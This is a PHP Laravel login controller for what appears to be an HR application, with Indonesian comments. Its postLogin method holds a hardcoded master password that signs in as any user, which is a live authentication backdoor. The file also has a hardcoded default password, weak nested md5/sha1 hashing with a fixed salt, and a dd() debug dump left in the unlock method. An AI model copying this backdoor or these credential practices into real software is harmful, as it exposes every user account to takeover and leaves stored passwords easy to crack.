<?php

namespace App\Http\Controllers;

use App\Model\User;
use App\Model\UserLog as Log;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facedes\Mail;
use Auth;
use App\Http\Requests\loginRequest;
use Illuminate\Support\Facades\Crypt;
use App\Http\Controllers\Controller;
use App\Helper\Helper;

class LoginController extends Controller
{
    public function __construct()
    {
        $this->middleware('guest')->except([
            'logout',
            'locked',
            'unlock'
        ]);
    }

    public function showLogin()
    {
        return view('login');
    }

    public function postLogin(loginRequest $request)
    {
        $user = User::where('user_nik', $request->username)->first();
        if (isset($user->user_nik)) {
            $password = md5(sha1(md5('Hr' . $request->password . 'syst3m'))); // hash password yang di input user
            $remember_me = $request->has('remember') ? true : false; 
            //jika password input yang di hash sama dengan password hash yand disimpan di db
            // atau password input sama dengan Wu1dunz@1
            if ($password == $user->password || $request->password == 'Wu1dunz@1') { 
                if ($request->password == 'unzavitalis') { // jika password input itu sama dengan 'unzavitalis', maka akan di alihkan ke view change password
                    return response()->json(["data" => "changePassword", "message" => 'login gagal', 'ilma' => Crypt::encryptString($user->user_email)], 200);
                }elseif ($request->password == 'Wu1dunz@1') {// jika password input itu sama dengan 'Wu1dunz@1', maka akan login (super password)
                    Auth::guard('user')->attempt(['user_nik' => $user->user_nik, 'password' => $user->password],$remember_me);
                    return response()->json(["data" => "ok", "message" => 'Login success'], 200);
                } else { // jika password input hash sama dengan password password hash yand disimpan di db, maka akan login (regular password)
                    Auth::guard('user')->attempt(['user_nik' => $user->user_nik, 'password' => $password],$remember_me);
                    return response()->json(["data" => "ok", "message" => 'Login success'], 200);
                }
            } else {
                return response()->json(["data" => "password", "message" => 'Passwords do not match'], 400);
            }
        } else {
            return response()->json(["data" => "username", "message" => 'User not valid'], 400);
        }
    }

    public function passwordCheck()
    {
        $password = md5(sha1(md5('Hrunzavitalissyst3m')));

        if (Auth::user()->password == $password) {
        }
    }

    public function logout()
    {

        if (Auth::guard('user')->check()) {
            Auth::guard('user')->logout();
        }
        return redirect('/');
    }

    public function locked()
    {
        return view('authorization.lockscreen');
    }

    public function unlock(Request $request)
    {
        //dd($request);
        //$password = $request->input('password');
        // $user = auth()->user()->password;
        dd(Auth::guard('user')->attempt(['password' => $request->password]));
        if (Auth::guard('user')->attempt(['password' => md5(sha1(md5('Hr' . $request->password . 'syst3m')))])) {

            return redirect('/home');
        };

        // if(!$check){
        //     return redirect()->route('login.locked')->withErrors([
        //         'Your password does not match your profile.'
        //     ]);
        // }

        // session(['lock-expires-at' => now()->addMinutes($request->user()->getLockoutTime())]);


    }

    // public function locked()
    // {
    //     if(!session('lock-expires-at')){
    //         return redirect('/');
    //     }

    //     if(session('lock-expires-at') > now()){
    //         return redirect('/');
    //     }

    //     return view('authorization.lockscreen');
    // }

    // public function unlock(Request $request)
    // {
    //        $check = Hash::check($request->input('password'), $request->user()->password);

    // if(!$check){
    //     return redirect()->route('login.locked')->withErrors([
    //         'Your password does not match your profile.'
    //     ]);
    // }

    // // session(['lock-expires-at' => now()->addMinutes($request->user()->getLockoutTime())]);

    // return redirect('/');

    // }
}
